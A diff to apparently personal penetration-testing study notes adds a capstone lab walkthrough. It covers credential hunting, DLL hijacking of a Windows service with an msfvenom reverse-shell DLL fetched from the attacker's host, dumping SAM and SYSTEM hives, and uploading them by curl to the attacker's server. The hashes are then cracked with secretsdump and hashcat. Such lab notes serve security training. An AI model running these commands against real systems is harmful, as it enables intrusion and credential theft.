@@ -2283,7 +2283,49 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
     net user
     xfreerdp3 /u:dave4 /p:lab +clipboard /v:192.168.185.220 /cert:ignore /drive:share,/home/kali/share 
     ```
-  - Capstone Lab for security update  
+  - **Capstone** Lab for pivoting users via reverse shell and hashes extract
+    -  search sensitive info > notes.txt  
+       `Get-ChildItem -Path C:\Users\diana\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue`  
+    -  found credentials for Alex  
+       who's responsible for Jenkins? ask Alex after holiday  
+       Default password for new resets will be WelcomeToWinter0121  
+       `xfreerdp3 /u:alex /p:WelcomeToWinter0121 /v:192.168.185.222 /cert:ignore /drive:share,/home/kali/share`
+    -  Enumerate running services  
+       `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`  
+       output: C:\Services\EnterpriseService.exe  
+    -  Explore C:\Services\ directory and Found a log file
+       [00:00:00.000] (b8c) WARN   Couldn't load EnterpriseServiceOptional.dll, only using basic features  
+    -  Try replace the "EnterpriseServiceOptional.dll" > not working  
+       `x86_64-w64-mingw32-gcc EnterpriseServiceOptional.cpp --shared -o EnterpriseServiceOptional.dll`
+       `iwr -uri http://192.168.45.221/EnterpriseServiceOptional.dll -OutFile 'C:\Services\EnterpriseServiceOptional.dll'`  
+    -  Try reverse shell > shell obtained  
+       `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.221 LPORT=4444 -f dll -o reverse.dll`  
+       `iwr -uri http://192.168.45.221/reverse.dll -OutFile 'C:\Services\EnterpriseServiceOptional.dll'`
+       `Restart-Service EnterpriseService`  
+    -  Powershell cannot be used in reverse shell  
+    -  `whoami /priv` enterpriseuser: (SeImpersonatePrivilege, SeBackupPrivilege)
+    -  Not working for SigmaPotato -  try SeBackupPrivilege with SAM dump
+    -  Extract hashes from SAM and SYSTEM  
+       `reg save HKLM\SAM sam` `reg save HKLM\SYSTEM system`  
+    -  transfer files from victim reverse shell to kali  
+       ```
+       mkdir -p /home/kali/upload
+       cd /home/kali/upload
+       pipx install uploadserver
+       python3 -m uploadserver --directory /home/kali/uploads --port 8000
+       curl -X POST http://192.168.45.221:8000/upload -F "files=@C:\Users\enterpriseuser\sam"
+       curl -X POST http://192.168.45.221:8000/upload -F "files=@C:\Users\enterpriseuser\system"
+       ```
+    -  Extract the hashes using secretsdump.py  
+       ```
+       pipx install impacket
+       secretsdump.py -sam /home/kali/uploads/sam -system /home/kali/uploads/system LOCAL
+       enterpriseadmin:1001:aad3b435b51404eeaad3b435b51404ee:d94267c350fc02154f2aff04d384b354:::
+
+       echo "d94267c350fc02154f2aff04d384b354" > hash.txt
+       hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+       ```
+    -  RDP enterpriseadmin `xfreerdp3 /u:enterpriseadmin /p:S3cureStore /v:192.168.185.222 /cert:ignore /drive:share,/home/kali/share`  
 
 ## Penetration testing report 
 - note editor:
